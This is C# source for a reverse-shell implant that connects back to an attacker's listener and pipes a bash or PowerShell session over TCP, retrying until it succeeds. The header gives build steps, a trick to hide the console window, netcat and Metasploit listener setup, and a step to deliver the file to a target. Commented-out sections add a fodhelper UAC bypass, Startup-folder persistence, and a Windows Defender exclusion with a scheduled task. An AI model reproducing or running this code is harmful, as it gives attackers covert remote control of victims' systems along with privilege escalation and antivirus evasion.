/*
0) setup the project directory 
    $ mkdir ~/shell && cd $_ && dotnet new console && cp THISFILE ./Program.cs
1) (optional) change the config variables
2) compile the executable
    $ dotnet publish -c Release -r win-x86 -p:PublishSingleFile=true -p:PublishTrimmed=true --self-contained true -o .
    # or                    ... -r linux-x64 ...
3) (optional for PE) turn the executable stealth to users
    - converting subsystem field from cui (3) to gui (2)
        $ printf "$(python -c 'pe_offset=0x100; subsystem_offset=0x5c; print(hex(pe_offset + subsystem_offset)[2:])'): 02" | xxd -r - shell.exe
        - https://www.codeguru.com/cpp/w-p/system/misc/article.php/c2897/Determine-if-an-Application-is-Console-or-GUI.htm
        - https://upload.wikimedia.org/wikipedia/commons/1/1b/Portable_Executable_32_bit_Structure_in_SVG_fixed.svg
4) run a listener
    $ nc -lvp 1792
OR
    $ msfconsole
        use multi/handler
        set PAYLOAD windows/shell_reverse_tcp 
        set LHOST address
        set LPORT 1792
        set ExitOnSession 0
        run -jz
        sessions
5) deliver the executable
*/
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Security.Claims;
using Microsoft.Win32;


// CONFIG VARIABLES
const string LISTEN_ADDRESS = "1.2.3.4";
const int LISTEN_PORT = 1792;
const int IDLE_TIMEOUT = 4 * 60 * 1000;
const int RETRY_DELAY = 5 * 1000;
// END

StreamWriter? outputStream;
bool isWindows = RuntimeInformation.IsOSPlatform(OSPlatform.Windows);

string prefix = "$ ";
string shell = "bash";
if (isWindows) {
    prefix = "> ";
    shell = "powershell";
}

void OpenShell(string address, int port, string shell)
{
    var client = new TcpClient(address, port);
    client.ReceiveTimeout = IDLE_TIMEOUT;
    StreamReader inputStream = new StreamReader(client.GetStream());
    outputStream = new StreamWriter(client.GetStream());

    Process process = CreateShellProcess(shell);
    process.OutputDataReceived += new DataReceivedEventHandler(OutputDataHandler);
    process.ErrorDataReceived += new DataReceivedEventHandler(OutputDataHandler);
    process.Start();
    process.BeginOutputReadLine();
    process.BeginErrorReadLine();

    string? line;
    try {
        while ((line = inputStream.ReadLine()) != null)
        {
            process.StandardInput.WriteLine(line);
        }
    } catch (Exception) {
        client?.GetStream().Close();
        client?.Close();
        throw;
    }
}

Process CreateShellProcess(string shell, bool debugOutput = false) {
    Process process = new Process();
    process.StartInfo.FileName = shell;
    process.StartInfo.CreateNoWindow = !debugOutput;
    process.StartInfo.UseShellExecute = false;
    process.StartInfo.RedirectStandardInput = true;
    process.StartInfo.RedirectStandardOutput = !debugOutput;
    process.StartInfo.RedirectStandardError = !debugOutput;
    return process;

}

void OutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
    if (!String.IsNullOrEmpty(outLine.Data))
    {
        outputStream?.WriteLine(outLine.Data);
        outputStream?.Flush();
    } 
}

/*
bool IsInAdminGroup() {
    if (!isWindows) return false;
    WindowsPrincipal principal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
    var adminGroup = new List<Claim>(principal.UserClaims).Find(
        claim => claim.Value.Contains("S-1-5-32-544")
    );
    if (adminGroup != null) {
        return true;
    }    
    return false;
}

bool IsRunningAsAdmin()
{
    if (!isWindows) return false;
    var principal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
    return principal.IsInRole(WindowsBuiltInRole.Administrator);
}

void TryBypassUAC() {
    // https://github.com/winscripting/UAC-bypass
    Process process = CreateShellProcess("powershell");
    process.Start();
    process.StandardInput.WriteLine(@$"
        reg add 'HKCU\SOFTWARE\Classes\ms-settings\shell\open\command' /f
        $registryPath = 'HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command'
        Set-ItemProperty -Path $registryPath -Name 'DelegateExecute' -Value ''
        Set-ItemProperty -Path $registryPath -Name '(Default)' -Value '{Environment.CommandLine}'
        Start-Process -FilePath 'C:\Windows\System32\fodhelper.exe'
        Start-Sleep 2
        Remove-Item -Path 'HKCU:\SOFTWARE\Classes\ms-settings' -Recurse -Force
    ");
}
*/

/*
void Persistence()
{
    try
    {
        string pathStartUp = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        var exe = Process.GetCurrentProcess().MainModule.FileName;
        var destiny = Path.Combine(pathStartUp, Path.GetFileName(exe));
        if (!(new FileInfo(destiny).Exists))
        {
            var data = File.ReadAllBytes(exe);
            File.WriteAllBytes(destiny, data);
        }
    }
    catch (Exception)
    {
    }
}
*/
// Persistence();

string address = LISTEN_ADDRESS;
int port = LISTEN_PORT;


string[] arguments = Environment.GetCommandLineArgs();
if (arguments.Length > 3) {
    shell = arguments[3];
}

if (arguments.Length > 2) {
    port = int.Parse(arguments[2]);
}

if (arguments.Length > 1) {
    address = arguments[1];
}

bool running = true;
while (running)
{
    try
    {
        // if (!isWindows || !IsInAdminGroup()) {
        OpenShell(address, port, shell);
        // } else {
        //     // running in windows user member of builtin admin group
        //     if (!IsRunningAsAdmin()) {
        //         TryBypassUAC();
        //         running = false;
        //     } else {
        //         //get if already is in defender exclusion list
        //         var exclusionProcesses = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes", Environment.CommandLine, null);
        //         if (exclusionProcesses == null) {
        //             // some seconds till be AV catch you
        //             // adding the exe in the AV exception
        //             Process process = CreateShellProcess("powershell");
        //             process.Start();
        //             process.StandardInput.WriteLine($@"
        //                 Set-MpPreference -ExclusionProcess '{Environment.CommandLine}'
        //                 $timestamp = New-TimeSpan -Minutes 1
        //                 $time = ((get-date) + $timestamp).ToString(""HH:mm"")
        //                 schtasks /create /tn 'RemoteSystemTask' /f /tr '{Environment.CommandLine}' /sc once /st $time
        //             ");
        //             running = false;
        //         } else {
        //             // schtasks running the exe
        //             OpenShell(address, port, shell);
        //         }
        //     } 
        // }   
    } catch (Exception) { }
    finally
    {
        Thread.Sleep(RETRY_DELAY);
    }
}


